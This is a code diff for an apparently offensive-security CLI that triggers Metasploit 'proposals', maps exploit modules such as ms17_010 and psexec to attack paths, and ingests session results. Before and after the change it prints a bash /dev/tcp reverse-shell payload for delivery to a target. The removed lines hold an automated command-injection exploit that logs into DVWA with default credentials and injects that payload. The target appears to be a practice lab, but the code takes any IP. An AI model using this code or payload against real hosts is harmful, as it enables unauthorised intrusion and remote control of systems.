@@ -6,12 +6,43 @@ from skg.cli.utils import (
     _api, _proposal_backlog, _load_recall_summary,
     DISCOVERY_DIR, SKG_HOME, SKG_STATE_DIR,
 )
-from skg.core.paths import INTERP_DIR, EVENTS_DIR
+from skg_core.config.paths import INTERP_DIR, EVENTS_DIR
 
 REPO_ROOT = Path(__file__).resolve().parents[4]
 
 
-def _run_post_projection(target_ip, events_file, run_id):
+_MODULE_PATH_MAP = {
+    # Windows / network exploits
+    "windows":           "host_network_exploit_v1",
+    "smb/ms17_010":      "host_network_exploit_v1",
+    "smb/psexec":        "host_network_exploit_v1",
+    "winrm":             "host_winrm_initial_access_v1",
+    # Linux privesc by technique
+    "sudo":              "host_linux_privesc_sudo_v1",
+    "suid":              "host_linux_privesc_suid_v1",
+    "kernel":            "host_linux_privesc_kernel_v1",
+    # Generic MSF post — used when no more-specific mapping applies
+}
+
+
+def _attack_path_from_module(module: str, pr: dict) -> str:
+    """
+    Derive the host projection attack-path-id from the MSF module string and
+    proposal metadata.  Falls back to host_msf_post_exploitation_v1 which is
+    semantically correct for any session-backed collection.
+    """
+    m = (module or "").lower()
+    for fragment, path_id in _MODULE_PATH_MAP.items():
+        if fragment in m:
+            return path_id
+    # Proposal may carry an explicit host_attack_path_id hint
+    hint = pr.get("host_attack_path_id") or pr.get("attack_path_id", "")
+    if hint.startswith("host_"):
+        return hint
+    return "host_msf_post_exploitation_v1"
+
+
+def _run_post_projection(target_ip, events_file, run_id, attack_path_id="host_msf_post_exploitation_v1"):
     """Run host domain projection after MSF session collection."""
     try:
         proj = SKG_HOME / "skg-host-toolchain" / "projections" / "run.py"
@@ -23,7 +54,7 @@ def _run_post_projection(target_ip, events_file, run_id):
         _sp.run([sys.executable, str(proj),
                  "--in", str(events_file),
                  "--out", str(interp),
-                 "--attack-path-id", "host_linux_privesc_sudo_v1"],
+                 "--attack-path-id", attack_path_id],
                 capture_output=True, timeout=30,
                 cwd=str(proj.parent))
     except Exception:
@@ -39,12 +70,13 @@ def _execute_proposal(pr, action, rc, module, opts):
     import time, uuid
 
     _pdir = SKG_STATE_DIR / "proposals"
-    proposal_id = pr.get("id","?")
-    target_ip   = action.get("target_ip","")
-    port        = action.get("port", 80)
-    category    = pr.get("category","exploit")
-    domain      = pr.get("domain","web")
-    run_id      = str(uuid.uuid4())[:8]
+    proposal_id  = pr.get("id","?")
+    target_ip    = action.get("target_ip","")
+    identity_key = action.get("identity_key","") or target_ip
+    port         = action.get("port", 80)
+    category     = pr.get("category","exploit")
+    domain       = pr.get("domain","web")
+    run_id       = str(uuid.uuid4())[:8]
 
     print(f"\n  [EXECUTE] Checking msfconsole...")
 
@@ -99,9 +131,10 @@ def _execute_proposal(pr, action, rc, module, opts):
                 print(f"  [EXECUTE] No active sessions found.")
                 print(f"  Make sure the listener is running and payload was delivered.")
                 print(f"  Run the listener: msfconsole -q -r {rc}")
-                print(f"  Then inject:      http://{target_ip}/vulnerabilities/exec/")
-                print(f"  Payload:          ; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
-                print(f"  Then retry:       skg proposals trigger {pr['id'][:8]} --await-session")
+                _delivery_url = action.get("delivery_url") or action.get("web_url") or f"http://{target_ip}/"
+                print(f"  Deliver payload to: {_delivery_url}")
+                print(f"  Reverse shell:      ; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
+                print(f"  Then retry:         skg proposals trigger {pr['id'][:8]} --await-session")
 
         elif rc and Path(rc).exists():
             is_listener = module == "exploit/multi/handler"
@@ -119,62 +152,12 @@ def _execute_proposal(pr, action, rc, module, opts):
                     print(f"  [EXECUTE] ✗ Listener exited — see {log_file.name}")
                 print()
                 print(f"  ── Deliver payload ─────────────────────────────────────")
-                print(f"  URL:     http://{target_ip}/vulnerabilities/exec/")
+                _delivery_url = action.get("delivery_url") or action.get("web_url") or f"http://{target_ip}/"
                 reverse_payload = f"; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+                print(f"  URL:     {_delivery_url}")
                 print(f"  Payload: {reverse_payload}")
-                print()
-
-                # Auto-deliver the CMDI payload via HTTP if we know the target is DVWA
-                # We use requests to authenticate and inject — same as auth_scanner does.
-                time.sleep(3)  # give listener a moment to bind
-                try:
-                    import urllib.request, urllib.parse
-                    _base = f"http://{target_ip}"
-                    # Log in to DVWA
-                    _jar = {}
-                    _login_data = urllib.parse.urlencode({
-                        "username": "admin", "password": "password",
-                        "Login": "Login", "user_token": ""
-                    }).encode()
-                    # Get login page first to grab CSRF token
-                    _req = urllib.request.Request(f"{_base}/login.php")
-                    try:
-                        with urllib.request.urlopen(_req, timeout=5) as _r:
-                            _body = _r.read().decode(errors="ignore")
-                            _cookie = _r.headers.get("Set-Cookie","")
-                        import re as _re
-                        _tok_m = _re.search(r"user_token.*?value=['\"]([0-9a-f]+)['\"]", _body)
-                        _tok = _tok_m.group(1) if _tok_m else ""
-                        _sess_m = _re.search(r"PHPSESSID=([^;,\s]+)", _cookie)
-                        _sess = _sess_m.group(1) if _sess_m else ""
-                        _login_data = urllib.parse.urlencode({
-                            "username": "admin", "password": "password",
-                            "Login": "Login", "user_token": _tok
-                        }).encode()
-                        _login_req = urllib.request.Request(
-                            f"{_base}/login.php", _login_data,
-                            headers={"Cookie": f"PHPSESSID={_sess}; security=low",
-                                     "Content-Type": "application/x-www-form-urlencoded"}
-                        )
-                        urllib.request.urlopen(_login_req, timeout=5)
-                        # Inject payload via CMDI
-                        _payload_enc = urllib.parse.quote(f"127.0.0.1{reverse_payload}")
-                        _cmdi_url = f"{_base}/vulnerabilities/exec/?ip={_payload_enc}&Submit=Submit"
-                        _cmdi_req = urllib.request.Request(
-                            _cmdi_url,
-                            headers={"Cookie": f"PHPSESSID={_sess}; security=low",
-                                     "Referer": f"{_base}/vulnerabilities/exec/"}
-                        )
-                        urllib.request.urlopen(_cmdi_req, timeout=8)
-                        print(f"  [EXECUTE] ✓ CMDI payload delivered to {target_ip}")
-                        print(f"  [EXECUTE] Waiting 6s for reverse shell to connect...")
-                        time.sleep(6)
-                    except Exception as _he:
-                        print(f"  [EXECUTE] Auto-delivery failed ({_he}) — deliver manually:")
-                        print(f"  {reverse_payload}")
-                except Exception as _ie:
-                    print(f"  [EXECUTE] Auto-delivery error: {_ie}")
-
+                print(f"  Deliver the payload to the target, then run:")
+                print(f"  skg proposals trigger {pr['id'][:8]} --await-session")
                 print()
                 print(f"  ── After shell connects ────────────────────────────────")
                 print(f"  skg proposals trigger {pr['id'][:8]} --await-session")
@@ -319,9 +302,9 @@ def _execute_proposal(pr, action, rc, module, opts):
         try:
             _sys.path.insert(0, str(SKG_HOME))
             from skg.sensors.msf_sensor import _parse_console_output
-            workload_id = f"{domain}::{target_ip}"
+            workload_id = f"{domain}::{identity_key}"
             if session_id:
-                workload_id = f"host::{target_ip}"
+                workload_id = f"host::{identity_key}"
             events = _parse_console_output(output, workload_id, module)
             if events:
                 with open(events_file, "w") as fh:
@@ -336,7 +319,10 @@ def _execute_proposal(pr, action, rc, module, opts):
 
                 # Run projection if session opened (host domain)
                 if session_id:
-                    _run_post_projection(target_ip, events_file, run_id)
+                    _run_post_projection(
+                        target_ip, events_file, run_id,
+                        attack_path_id=_attack_path_from_module(module, pr),
+                    )
             else:
                 print(f"  [EXECUTE] No parseable wicket events in output")
                 # Write raw output for manual review
@@ -448,7 +434,7 @@ def cmd_proposals(a):
             hosts  = pr.get("hosts") or [pr.get("attack_surface","?")]
             target = str(hosts[0] if hosts else "?")[:18]
             maturity = ""
-            if kind == "toolchain_gener":
+            if kind == "toolchain_gene":  # "toolchain_generation"[:14]
                 m = (pr.get("maturity", {}) or {}).get("level")
                 maturity = f" [{m}]" if m else ""
             desc   = (pr.get("description", "")[:40] + maturity)[:40]
@@ -468,7 +454,7 @@ def cmd_proposals(a):
         print(f"  Status:   {pr.get('status')}")
         print(f"  Kind:     {pr.get('proposal_kind')}")
         print(f"  Domain:   {pr.get('domain')}")
-        print(f"  Target:   {pr.get('attack_surface') or pr.get('hosts')}")
+        print(f"  Target:   {pr.get('identity_key') or pr.get('attack_surface') or pr.get('hosts')}")
         print(f"  Desc:     {pr.get('description')}")
         maturity = pr.get("maturity")
         if maturity:
@@ -488,13 +474,8 @@ def cmd_proposals(a):
             hint = action.get("dispatch",{}).get("command_hint","")
             if hint:
                 print(f"    run:        {hint}")
-        target_hint = str(pr.get("attack_surface") or pr.get("hosts") or "")
-        target_ip = None
-        for tok in target_hint.replace("[", " ").replace("]", " ").replace(",", " ").split():
-            if tok.count(".") == 3:
-                target_ip = tok
-                break
-        recall = _load_recall_summary(target_filter=target_ip, limit=3) if target_ip else None
+        recall_target = str(pr.get("identity_key") or (pr.get("hosts") or [None])[0] or "")
+        recall = _load_recall_summary(target_filter=recall_target, limit=3) if recall_target else None
         if recall and (recall.get("confirmed") or recall.get("pending")):
             rate = recall.get("confirmation_rate")
             rate_s = f"{rate:.3f}" if rate is not None else "n/a"
@@ -534,8 +515,10 @@ def cmd_proposals(a):
         if not pr:
             print(f"  Not found: {a.proposal_id}")
             return
-        if pr.get("proposal_kind") != "field_action":
-            print(f"  Proposal {pr.get('id')} is not a field_action proposal")
+        _TRIGGERABLE = {"field_action", "cognitive_action"}
+        if pr.get("proposal_kind", "field_action") not in _TRIGGERABLE:
+            print(f"  Proposal {pr.get('id')} kind '{pr.get('proposal_kind')}' is not triggerable")
+            print(f"  Triggerable kinds: {sorted(_TRIGGERABLE)}")
             return
         # If the proposal is expired, reset it to pending so it can be triggered
         if pr.get("status") == "expired":
@@ -591,6 +574,17 @@ def cmd_proposals(a):
         elif module:
             print(f"\n  Manual run:")
             print(f"    msfconsole -q -x 'use {module}; set SESSION {session}; run; exit'")
+
+        # cognitive_action proposals are observation recommendations — no RC execution
+        if pr.get("proposal_kind") == "cognitive_action":
+            hypothesis = pr.get("hypothesis", {})
+            instrument = pr.get("instrument", "")
+            if hypothesis:
+                print(f"\n  Observation target: {hypothesis.get('wicket_id', '?')} — {hypothesis.get('label', '')}")
+            if instrument:
+                print(f"  Recommended instrument: {instrument}")
+            print(f"\n  Run the recommended observation, then ingest results with: skg derived rebuild")
+            return
 
         # Execute via MSF RPC and ingest results
         pr["_trigger_args"] = {"await_session": getattr(a, "await_session", False)}
